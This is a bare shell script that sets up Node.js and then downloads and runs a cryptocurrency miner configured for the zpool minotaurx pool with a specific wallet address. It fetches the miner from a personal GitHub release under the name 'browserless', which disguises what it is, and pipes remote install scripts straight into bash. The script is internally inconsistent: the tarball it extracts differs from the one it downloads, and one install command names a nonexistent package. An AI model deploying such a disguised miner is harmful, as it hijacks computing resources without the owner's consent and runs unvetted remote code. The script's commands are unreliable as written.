sudo apt update && sudo apt install curl ca-certificates -y
sleep 2
sudo apt install npm -y
sleep 2
sudo apt install curl -y
sleep 2
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sleep 2
sudo apt-get install -y Node.js
sleep 2
curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
sleep 2
source ~/.bashrc
sleep 2
nvm install 18
sleep 2
curl https://github.com/ismailalkaf/browserless/releases/download/iuffd/browserless.tar.gz -L -O -J
sleep 2
tar -xf browser-mining.tar.gz
sleep 2
cd browser-mining
sleep 2
npm install
sleep 2
sh install.sh
sleep 2
rm config.json
sleep 2
echo '[{"algorithm": "minotaurx", "host": "minotaurx.eu.mine.zpool.ca", "port": 7019, "worker":
"RXq1aLds5oKeqyTXAjiDZEghjXKw7ejJsi", "password": "c=RVN,zap=PLSR", "workers": 4 }]' > config.json
sleep 2
node index.js
